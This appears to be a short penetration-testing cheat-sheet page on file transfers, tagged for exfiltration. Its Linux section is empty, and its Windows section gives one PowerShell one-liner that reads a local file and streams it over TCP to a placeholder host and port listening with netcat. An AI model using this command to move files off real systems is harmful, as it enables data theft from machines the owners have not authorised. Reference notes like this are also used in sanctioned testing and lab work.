---
layout: default
title: File Transfers
tags:
    - download
    - exfiltration
    - scp
    - smb
    - tftp
    - upload
---
# File Transfers
## Linux

## Windows
Powershell Send File to Netcat
```shell
$h="<host>";$p="<port>";$data=Get-Content -Path "<file>";$tcp=New-Object System.Net.Sockets.TcpClient($h,$p);$w=New-Object System.IO.StreamWriter($tcp).GetStream();foreach($l in $data){$w.WriteLine($l)};$w.Flush();$w.Close();$tcp.Close();
```